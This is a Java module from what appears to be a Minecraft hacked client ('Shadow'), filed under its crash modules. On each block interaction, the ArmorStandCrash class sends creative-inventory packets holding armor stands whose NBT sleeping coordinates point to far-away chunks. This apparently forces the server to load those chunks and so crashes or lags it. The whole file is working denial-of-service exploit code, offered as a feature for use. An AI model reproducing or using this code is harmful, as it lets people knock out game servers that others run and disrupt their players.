package net.shadow.feature.module.crash;

import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.NbtCompound;
import net.minecraft.nbt.NbtInt;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerInteractBlockC2SPacket;
import net.shadow.Shadow;
import net.shadow.event.events.PacketOutput;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.SliderValue;

import java.util.Random;

public class ArmorStandCrash extends Module implements PacketOutput {
    SliderValue slider = this.config.create("Power", 1, 1, 20, 0);
    private int xChunk;
    private int zChunk;

    public ArmorStandCrash() {
        super("ArmorStand", "crash amor stand", ModuleType.CRASH);
    }


    @Override
    public void onEnable() {
        Random random = new Random();
        xChunk = random.nextInt(100000) - 100000;
        zChunk = random.nextInt(100000) - 50000;
        Shadow.getEventSystem().add(PacketOutput.class, this);
    }

    @Override
    public void onDisable() {
        Shadow.getEventSystem().remove(PacketOutput.class, this);
    }

    @Override
    public void onUpdate() {
    }

    @Override
    public void onRender() {

    }

    @Override
    public void onSentPacket(PacketOutputEvent event) {
        if (event.getPacket() instanceof PlayerInteractBlockC2SPacket packet) {
            ItemStack load = new ItemStack(Items.ARMOR_STAND, 1);
            NbtCompound comp = new NbtCompound();
            NbtCompound betag = new NbtCompound();
            betag.put("SleepingX", NbtInt.of(xChunk << 4));
            betag.put("SleepingY", NbtInt.of(0));
            betag.put("SleepingZ", NbtInt.of(zChunk * 10 << 4));
            comp.put("EntityTag", betag);
            load.setNbt(comp);
            Shadow.c.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(Shadow.c.player.getInventory().selectedSlot + 36, load));
            xChunk += 10;
            zChunk++;
        }
    }
}
